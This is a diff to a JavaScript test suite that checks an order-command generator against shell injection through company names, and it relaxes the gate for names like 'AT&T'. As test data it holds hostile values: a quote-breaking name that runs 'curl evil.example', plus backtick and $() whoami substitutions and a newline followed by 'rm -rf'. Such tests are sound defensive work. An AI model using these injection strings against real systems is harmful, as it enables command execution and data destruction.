@@ -299,11 +299,11 @@ describe("getRecommendations", () => {
 
     it("emits null orderCommand when companyName has shell metacharacters", () => {
       // The H-2 vector: a hostile API-supplied display name breaks out of
-      // the `--company "${name}"` quote frame, and the REPL tokenizer
-      // (which still consumes `orderCommand` as a string until consumers
-      // migrate to `orderArgs`) re-parses the resulting argv with
-      // attacker-controlled --product / --quantity overrides. The gate
-      // here collapses both forms to null on any unsafe name character.
+      // the `--company "${name}"` quote frame. The gate collapses both
+      // forms to null on any char that ACTUALLY breaks the quote frame:
+      // `"`, `\`, backtick, `$`, newline/CR, NUL. After #509's consumer
+      // migration onto argv, that's the only remaining risk surface for
+      // the string form.
       const subs = [
         makeSub({ companyId: "c1", companyName: 'Acme" $(curl evil.example) "' }),
         makeSub({ companyId: "c2", companyName: "Has Backup" }),
@@ -317,6 +317,62 @@ describe("getRecommendations", () => {
       expect(rec).toBeDefined();
       expect(rec!.orderCommand).toBeNull();
       expect(rec!.orderArgs).toBeNull();
+    });
+
+    // After #509's consumer migration, the gate was relaxed to allow chars
+    // that are literal inside a double-quoted shell string (`;`, `|`, `&`,
+    // `<`, `>`). Names with `&` are the load-bearing case — `AT&T`,
+    // `Procter & Gamble`, `Johnson & Johnson` are real partner names that
+    // used to collapse to null. They now produce both forms.
+    it("admits common shell-safe-when-quoted chars in companyName (#509 relaxation)", () => {
+      const subs = [
+        makeSub({ companyId: "c1", companyName: "AT&T Communications" }),
+        makeSub({ companyId: "c2", companyName: "Has Backup" }),
+        makeSub({
+          companyId: "c2", companyName: "Has Backup",
+          productId: "prod-bk", productName: "Datto SaaS Protection", price: 5,
+        }),
+      ];
+      const report = getRecommendations(subs);
+      const rec = report.recommendations.find(
+        (r) => r.companyId === "c1" && r.title.includes("Datto"),
+      );
+      expect(rec).toBeDefined();
+      // String form: the name lands inside double quotes, `&` is literal there.
+      expect(rec!.orderCommand).toContain('--company "AT&T Communications"');
+      // Argv form: name is one argv element regardless of contents.
+      expect(rec!.orderArgs).toContain("AT&T Communications");
+    });
+
+    it("still rejects companyName with quote-frame-breaking chars", () => {
+      // Pin the chars that MUST still null-collapse. Each entry breaks the
+      // double-quote frame in a different way; running any of these through
+      // `bash -c '<orderCommand>'` would execute attacker code.
+      const breakers = [
+        'Acme"',                       // closes the quote
+        'Acme\\',                      // backslash escape
+        'Acme`whoami`',                // backtick command substitution
+        'Acme$(whoami)',               // $() command substitution
+        'Acme${HOME}',                 // $VAR expansion
+        "Acme\nrm -rf",                // newline ends the line
+      ];
+      for (const hostile of breakers) {
+        const subs = [
+          makeSub({ companyId: "c1", companyName: hostile }),
+          makeSub({ companyId: "c2", companyName: "Has Backup" }),
+          makeSub({
+            companyId: "c2", companyName: "Has Backup",
+            productId: "prod-bk", productName: "Datto SaaS Protection", price: 5,
+          }),
+        ];
+        const report = getRecommendations(subs);
+        const rec = report.recommendations.find(
+          (r) => r.companyId === "c1" && r.title.includes("Datto"),
+        );
+        expect(rec, `companyName=${JSON.stringify(hostile)} should produce a rec`).toBeDefined();
+        expect(rec!.orderCommand, `companyName=${JSON.stringify(hostile)} should null-collapse orderCommand`).toBeNull();
+        expect(rec!.orderArgs, `companyName=${JSON.stringify(hostile)} should null-collapse orderArgs`).toBeNull();
+      }
     });
 
     it("emits null orderCommand when productId is not safe-identifier-shaped", () => {
